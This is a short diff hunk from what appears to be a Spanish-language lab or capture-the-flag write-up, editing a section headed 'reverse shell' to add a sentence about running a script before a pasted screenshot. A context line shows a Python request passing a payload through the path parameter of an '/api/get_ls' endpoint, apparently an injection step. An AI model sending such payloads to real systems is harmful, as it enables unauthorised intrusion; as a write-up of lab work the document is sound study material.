@@ -390,5 +390,5 @@ step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 
 
 ### reverse shell
-
+ejecutamos el script siguiendo los 
 ![[Pasted image 20240823162631.png]]
